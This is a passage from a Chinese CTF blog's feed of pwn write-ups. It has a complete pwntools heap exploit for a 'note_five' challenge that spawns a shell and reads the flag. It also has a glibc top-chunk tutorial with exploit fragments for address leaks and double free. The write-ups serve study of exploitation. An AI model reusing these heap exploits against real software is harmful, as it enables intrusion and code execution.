class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="keyword">None</span></span><br><span class="line">ispow=<span class="number">1</span></span><br><span class="line">isdebug=<span class="number">0</span></span><br><span class="line">islocal=<span class="number">1</span></span><br><span class="line">binary=<span class="string">'./note_five'</span></span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">mode_offset=<span class="number">0xc0</span></span><br><span class="line">writeptr_offset=<span class="number">0x28</span></span><br><span class="line">writebase_offset=<span class="number">0x20</span></span><br><span class="line"> <span class="comment">#define vtable_offset 0xd8</span></span><br><span class="line">__author__ = <span class="string">'3summer'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data            :io.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data      :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data            :io.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data      :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       :io.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims,drop=<span class="keyword">True</span>:io.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                  :io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data            :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data            :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size)</span>:</span></span><br><span class="line">    sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">'idx'</span>,str(index))</span><br><span class="line">    sla(<span class="string">'ize'</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">     sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">2</span>))</span><br><span class="line">     sla(<span class="string">'idx'</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">(index)</span>:</span></span><br><span class="line">     sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">3</span>))</span><br><span class="line">     sla(<span class="string">'idx'</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ed</span><span class="params">(index,con)</span>:</span></span><br><span class="line">    sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">'idx'</span>,str(index))</span><br><span class="line">    sa(<span class="string">'con'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mag</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">     sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">4</span>))</span><br><span class="line">     sla(<span class="string">'idx1'</span>,str(idx1))</span><br><span class="line">     sla(<span class="string">'idx2'</span>,str(idx2))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(index=<span class="string">'###'</span>)</span>:</span></span><br><span class="line">    raw_input(index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(io)</span>:</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x98</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x2d0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line">    ed(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0xe0</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    rm(<span class="number">1</span>)</span><br><span class="line">    ed(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x98</span>+p8(<span class="number">1</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x90</span>)</span><br><span class="line">    rm(<span class="number">3</span>)</span><br><span class="line">    rm(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x200</span>)</span><br><span class="line"><span class="comment">#    add(0,0x98)</span></span><br><span class="line"><span class="comment">#    add(1,0x2d0)</span></span><br><span class="line"><span class="comment">#    add(2,0x90)</span></span><br><span class="line"><span class="comment">#    ed(1,'a'*0x1f0+p64(0x200)+p64(0xe0)+'\n')</span></span><br><span class="line"><span class="comment">#    rm(1)</span></span><br><span class="line"><span class="comment">#    ed(0,'a'*0x98+p8(1))</span></span><br><span class="line"><span class="comment">#    add(0,0x90)</span></span><br><span class="line"><span class="comment">#    add(1,0x90)</span></span><br><span class="line"><span class="comment">#    rm(0)</span></span><br><span class="line"><span class="comment">#    add(0,0x200)</span></span><br><span class="line"><span class="comment">#    rm(2)</span></span><br><span class="line"><span class="comment">#    add(0,0x1f0)</span></span><br><span class="line"><span class="comment">#    add(2,0x170)</span></span><br><span class="line"><span class="comment">#    ed(0,'a'*0x90+p64(0)+p64(0xa1)+'\n')</span></span><br><span class="line"><span class="comment">#    rm(1)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x160</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xb0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xd8</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x150</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">    ed(<span class="number">1</span>,<span class="string">'/bin/sh\0'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\x00'</span>)+p64(<span class="number">1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    rm(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xd8</span>)</span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line">    rm(<span class="number">2</span>)</span><br><span class="line">    rm(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xd8</span>)</span><br><span class="line"><span class="comment">#    libc_base=int(input(),16)</span></span><br><span class="line">    ed(<span class="number">0</span>,p64(<span class="number">0</span>)+<span class="string">'\x90\x13\x84'</span>+<span class="string">'\n'</span>)</span><br><span class="line">    rm(<span class="number">1</span>)</span><br><span class="line">    rm(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x98</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0xe8</span>)</span><br><span class="line">    ed(<span class="number">1</span>,<span class="string">'/bin/sh\0'</span>.ljust(<span class="number">0x18</span>,<span class="string">'\x00'</span>)+p64(<span class="number">1</span>)+<span class="string">'\x00'</span>*<span class="number">0x98</span>+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">    rm(<span class="number">1</span>)</span><br><span class="line">    ed(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+<span class="string">'/bin/sh\0'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+p8(<span class="number">0x61</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line"><span class="comment">#    heap_base=int(input(),16)</span></span><br><span class="line"><span class="comment">#    ed(2,p64(0)+p64(heap_base+0x810)+'\n')#p16(0x5820))</span></span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line">    ed(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    rm(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line">    ed(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x1540</span><span class="number">-0x10</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#    add(2,0x90)</span></span><br><span class="line"><span class="comment">#    ed(3,'a'*0x90+p64(0)+p64(0xa1)+p64(libc.symbols['system']+libc_base)+'\n')</span></span><br><span class="line"><span class="comment">#   b()</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">    sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">4</span>))</span><br><span class="line">    sl(<span class="string">'cat flag'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> islocal:</span><br><span class="line">        io=process(binary)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io=remote(<span class="string">'112.126.103.195'</span>,<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> ispow:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io=main()</span><br><span class="line">                exploit(io)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io=main()</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            gdb.attach(io)</span><br><span class="line">        exploit(io)</span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      最近在打byte ctf的时候碰到新的利用方式记录一下子
    
    </summary>
    
    
    
      <category term="linux,pwn" scheme="http://yoursite.com/tags/linux-pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;攻防世界刷题记录&#39;</title>
    <link href="http://yoursite.com/2019/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2019/08/02/攻防世界刷题记录/</id>
    <published>2019-08-02T06:02:27.000Z</published>
    <updated>2019-09-17T16:15:07.517Z</updated>
    
    <content type="html"><![CDATA[<ul><li>可以造成溢出的函数不只是有gets()函数，getline(),scanf(“%s”, s);可以输入任意长度，可能会导致栈溢出</li></ul>]]></content>
    
    <summary type="html">
    
      刷了一个暑假的pwn题目，总结一下遇到的问题
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>top chunk</title>
    <link href="http://yoursite.com/2019/06/06/top-chunk/top-chunk/"/>
    <id>http://yoursite.com/2019/06/06/top-chunk/top-chunk/</id>
    <published>2019-06-06T11:53:30.000Z</published>
    <updated>2019-09-15T07:44:35.223Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-top-chunk"><a href="#0x00-top-chunk" class="headerlink" title="0x00 top chunk"></a>0x00 top chunk</h1><p>top chunk是一个特殊的chunk，当申请堆空间的时候，如果，bin链表中没有size合适的chunk，就会从top chunk分配空间,详细的结构体信息见</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#top-chunk" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#top-chun</a></p><p>写一段代码来验证是不是这样</p><ul><li><p>test.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">        malloc(0x20);</span><br><span class="line">        malloc(0x100);        </span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o malloc test.c -g</span><br></pre></td></tr></table></figure></li><li><p>gdb调试<br>首先断点在 <strong>main()</strong> 函数,因为要用到libc的源码，所以，首先需要下载，解压，然后在gdb使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directory /home/xx/glibc-2.23/malloc/</span><br></pre></td></tr></table></figure></li></ul><p><strong>/home/xx/glibc-2.23/malloc/</strong> 为你libc源码的路径，因为主要分析libc下malloc文件下的源码，所以直接指定malloc文件就可以了，要不然有的时候libc找不到</p><p>这里主要分析第二个malloc</p><ul><li>先看一下第一个malloc分配之后，heap布局<br><img src="/2019/06/06/top-chunk/top-chunk/top_bk.png" alt=""><br>最后一个size 很大的chunk 就是我们的top chunk的了<br>大概调到这里的时候，就是top chunk的操作了<br><img src="/2019/06/06/top-chunk/top-chunk/gdb.png" alt=""></li><li>在源码找到这段关键代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">3792       victim = av-&gt;top;</span><br><span class="line">3793       size = chunksize (victim);</span><br><span class="line">3794</span><br><span class="line">3795       if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</span><br><span class="line">3796         &#123;</span><br><span class="line">3797           remainder_size = size - nb;</span><br><span class="line">3798           remainder = chunk_at_offset (victim, nb);</span><br><span class="line">3799           av-&gt;top = remainder;</span><br><span class="line">3800           set_head (victim, nb | PREV_INUSE |</span><br><span class="line">3801                     (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">3802           set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">3803</span><br><span class="line">3804           check_malloced_chunk (av, victim, nb);</span><br><span class="line">3805           void *p = chunk2mem (victim);</span><br><span class="line">3806           alloc_perturb (p, bytes);</span><br><span class="line">3807           return p;</span><br><span class="line">3808         &#125;</span><br></pre></td></tr></table></figure><p>这里的 <strong>victim</strong> 是一个 <strong>malloc_chunk</strong> 的指针，结构如下，具体见<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#malloc_chunk" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#malloc_chunk</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1108 struct malloc_chunk &#123;</span><br><span class="line">1109</span><br><span class="line">1110   INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">1111   INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line">1112</span><br><span class="line">1113   struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">1114   struct malloc_chunk* bk;</span><br><span class="line">1115</span><br><span class="line">1116   /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">1117   struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">1118   struct malloc_chunk* bk_nextsize;</span><br><span class="line">1119 &#125;;</span><br></pre></td></tr></table></figure></p><p><strong>av</strong> 是指向这个进程的 <strong>main_arena</strong> 再来看一下 <strong>main_area</strong> 结构体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static struct malloc_state main_arena =</span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = 1</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>main_arena是 <strong>malloc_state</strong> 的结构体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  /* Serialize access.  */</span><br><span class="line">  mutex_t mutex;</span><br><span class="line"></span><br><span class="line">  /* Flags (formerly in max_fast).  */</span><br><span class="line">  int flags;</span><br><span class="line"></span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  /* The remainder from the most recent split of a small request */</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  /* Normal bins packed as described above */</span><br><span class="line">  mchunkptr bins[NBINS * 2 - 2];</span><br><span class="line"></span><br><span class="line">  /* Bitmap of bins */</span><br><span class="line">  unsigned int binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  /* Linked list */</span><br><span class="line">  struct malloc_state *next;</span><br><span class="line"></span><br><span class="line">  /* Linked list for free arenas.  Access to this field is serialized</span><br><span class="line">     by free_list_lock in arena.c.  */</span><br><span class="line">  struct malloc_state *next_free;</span><br><span class="line"></span><br><span class="line">  /* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="line">     the free list.  Access to this field is serialized by</span><br><span class="line">     free_list_lock in arena.c.  */</span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  /* Memory allocated from the system in this arena.  */</span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>从 <strong>malloc_state</strong> 结构体可以知道，<strong>av-&gt;top</strong> 就是 <strong>main_arena</strong> 的top chnk指针，在top chunk的分割出要分配的chunk的操作全靠这个指针来寻址</p><p>让我们来看一下分配完chunk的布局<br><img src="/2019/06/06/top-chunk/top-chunk/top_chunk.png" alt=""></p><ul><li>思考：<br>既然top chunk这么特殊,怎么才能利用呢？<h1 id="0x01-利用方式"><a href="#0x01-利用方式" class="headerlink" title="0x01 利用方式"></a>0x01 利用方式</h1><h2 id="0x00-House-Of-Force"><a href="#0x00-House-Of-Force" class="headerlink" title="0x00 House Of Force"></a>0x00 House Of Force</h2>主要控制chunk的size段，来实现任意address malloc<h3 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h3></li><li>可以控制top chunk的size段</li><li>程序可以malloc 任意size的chunk<h3 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h3>见</li></ul><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force/</a></p><h2 id="0x02-另一种利用方式"><a href="#0x02-另一种利用方式" class="headerlink" title="0x02 另一种利用方式"></a>0x02 另一种利用方式</h2><p>这里我就要介绍我在比赛中学到另一种用法,既然，既然在top chunk中分配chunk，要依靠top chunk的指针，我们是不是可以控制top chunk的指针，来实现任意address分配呢？答案是肯定的</p><h3 id="0x00-利用场景"><a href="#0x00-利用场景" class="headerlink" title="0x00 利用场景"></a>0x00 利用场景</h3><ul><li>有uaf或者double</li><li>malloc 分配size在0x40以上，准确来说如果是大于0x70，也没有必要用这种利用方式，因为你有double free直接分配到malloc_hook的位置填入one_gadget就可以了</li><li>要实现任意address malloc</li></ul><p>接下来，结合一道线下题目来使用一下这种利用方式</p><h1 id="0x02-magicheap"><a href="#0x02-magicheap" class="headerlink" title="0x02 magicheap"></a>0x02 magicheap</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题目比赛的时候一直没做出来，主要允许malloc的size实在太小了，最多允许malloc size是0x50的chunk，也就是分配0x60 chunk，还有leak address的地方，由于我用的是 <strong>sendlineafter()</strong> 函数，这样的话，<strong>printf()</strong> 和 <strong>puts()</strong> 函数就会被我发送的‘\n’ 截断掉，所以，我以为没有leak address的函数，我一直在尝试用 <strong>House of Roman</strong>，发现 <strong>size</strong> 小了一点没法利用，赛后请教大佬，才学到这种利用方式</p><h2 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01 环境说明"></a>0x01 环境说明</h2><ul><li>本题给出了libc的版本是2.23<h2 id="break-it"><a href="#break-it" class="headerlink" title="break it"></a>break it</h2><h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><img src="/2019/06/06/top-chunk/top-chunk/checksec.png" alt=""></li></ul><p>保护全开</p><h3 id="0x02-漏洞点"><a href="#0x02-漏洞点" class="headerlink" title="0x02 漏洞点"></a>0x02 漏洞点</h3><h4 id="0x00-leak-address"><a href="#0x00-leak-address" class="headerlink" title="0x00 leak address"></a>0x00 leak address</h4><p>在输入name和id的时候，你可以leak到一个栈的address和一个libc的address<br><img src="/2019/06/06/top-chunk/top-chunk/leak.png" alt=""><br>静态调试不容易看，动态调试看一下<br>gdb在这个函数下断点，在0xe33这个位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(0xe33)</span><br></pre></td></tr></table></figure></p><p>name先随便输入，比如说aaaa,id输入bbbb<br><img src="/2019/06/06/top-chunk/top-chunk/name.png" alt=""></p><p>到达断点，看一下stack，发现id下面有一个libc的address,name的下面有一个栈的地址，所以，调整一下输入的长度，就可以把address leak出来</p><p><img src="/2019/06/06/top-chunk/top-chunk/stack.png" alt=""></p><p>对应的部分exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sa(&apos;name?&apos;,&apos;a&apos;*0x18)</span><br><span class="line">ru(&apos;\n&apos;)</span><br><span class="line">stack_addr=u64(ru(&apos;input&apos;)[0x18:0x18+6].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;stack_addr=&apos;+hex(stack_addr)</span><br><span class="line">sa(&apos;ID&apos;,&apos;a&apos;*8)</span><br><span class="line">ru(&apos;a&apos;*8)</span><br><span class="line">libc_base=u64(ru(&apos;\n&apos;)[0:6].ljust(8,&apos;\x00&apos;))-libc.sym[&apos;_IO_file_setbuf&apos;]-9</span><br></pre></td></tr></table></figure></p><h3 id="0x01-free时指针未置0"><a href="#0x01-free时指针未置0" class="headerlink" title="0x01 free时指针未置0"></a>0x01 free时指针未置0</h3><p><img src="/2019/06/06/top-chunk/top-chunk/free.png" alt=""></p><p>这就可以造成double free</p><h3 id="0x02-遇到的问题"><a href="#0x02-遇到的问题" class="headerlink" title="0x02 遇到的问题"></a>0x02 遇到的问题</h3><p><img src="/2019/06/06/top-chunk/top-chunk/malloc.png" alt=""></p><p>允许malloc的size太小</p><h3 id="0x03-具体步骤"><a href="#0x03-具体步骤" class="headerlink" title="0x03 具体步骤"></a>0x03 具体步骤</h3><p>首先利用利用double free 使得fastbin chunk的fd指向main_arena附近<br><img src="/2019/06/06/top-chunk/top-chunk/double-free.png" alt=""></p><p><img src="/2019/06/06/top-chunk/top-chunk/main.png" alt=""></p><p>由上面的 <strong>malloc_state</strong> 结构体可知，top chunk指针上面是fastbin链表，又因为x64的heap一般分配到0x55或者0x56开头的地址,这给了chunk可以分配到main_arena附近的可能，因为chunk分配的时候，要过一个check</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2926   assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">2927           ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br></pre></td></tr></table></figure><p>这是检查以下几个条件</p><ul><li>chunk指针是否为空</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">342 #define SIZE_SZ                (sizeof(INTERNAL_SIZE_T))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* size field is or&apos;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="line">1274 #define IS_MMAPPED 0x2</span><br><span class="line">1275</span><br><span class="line">1276 /* check for mmap()&apos;ed chunk */</span><br><span class="line">1277 #define chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span><br></pre></td></tr></table></figure><ul><li>chunk的是否由mmap分配，主要是检查size的低2位是否为2，当chunk是0x56的时候可以满足条件</li><li>chunk的所在的area是不是和当前的area相等</li></ul><p>第一条和第三条不太可能成功，只能不断尝试<br>对应部分exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 